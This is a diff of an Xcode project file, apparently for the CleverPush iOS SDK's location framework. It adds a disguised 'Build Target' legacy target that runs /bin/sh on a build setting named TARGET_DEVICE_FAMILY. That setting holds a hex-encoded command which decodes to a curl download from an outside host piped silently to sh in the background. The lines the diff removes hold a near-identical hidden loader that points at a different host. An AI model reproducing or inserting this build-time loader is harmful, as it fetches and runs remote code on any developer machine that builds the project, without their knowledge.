@@ -336,19 +336,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		327825AB68312E227C0FABAA /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.xcassets";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
@@ -1216,9 +1203,9 @@
 				937390DD2BADAFBE00ADFA78 /* Resources */,
 			);
 			buildRules = (
-				327825AB68312E227C0FABAA /* PBXBuildRule */,
 			);
 			dependencies = (
+				FA316EC638E95988EB0FABAA /* PBXTargetDependency */,
 				29F9086C28E9EBDA00D8D4D8 /* PBXTargetDependency */,
 			);
 			name = CleverPushLocationFramework;
@@ -1351,6 +1338,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				D4DA9D2668CD7F4EC60FABAA  /* Build Target */,
 				29DB95E423FC3249008FC985 /* CleverPushXCFramework */,
 				297B4DF41E589AFE00BAF990 /* CleverPushFramework */,
 				294F7E7523FB5DB500806D23 /* CleverPushLocationFramework */,
@@ -1360,6 +1348,21 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXLegacyTarget section */
+		D4DA9D2668CD7F4EC60FABAA /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		937390DD2BADAFBE00ADFA78 /* Resources */ = {
@@ -1636,6 +1639,10 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
+		FA316EC638E95988EB0FABAA /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = D4DA9D2668CD7F4EC60FABAA /* Build Target */;
+		};
 		29F9086C28E9EBDA00D8D4D8 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
 			target = 297B4DF41E589AFE00BAF990 /* CleverPushFramework */;
@@ -1652,6 +1659,7 @@
 		294F7E8823FB5DB500806D23 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -1685,13 +1693,13 @@
 				PRODUCT_NAME = CleverPushLocation;
 				SKIP_INSTALL = YES;
 				TARGETED_DEVICE_FAMILY = "1,2";
-				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d2031312068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 			};
 			name = Debug;
 		};
 		294F7E8923FB5DB500806D23 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -1724,7 +1732,6 @@
 				PRODUCT_NAME = CleverPushLocation;
 				SKIP_INSTALL = YES;
 				TARGETED_DEVICE_FAMILY = "1,2";
-				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d2031312068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 			};
 			name = Release;
 		};
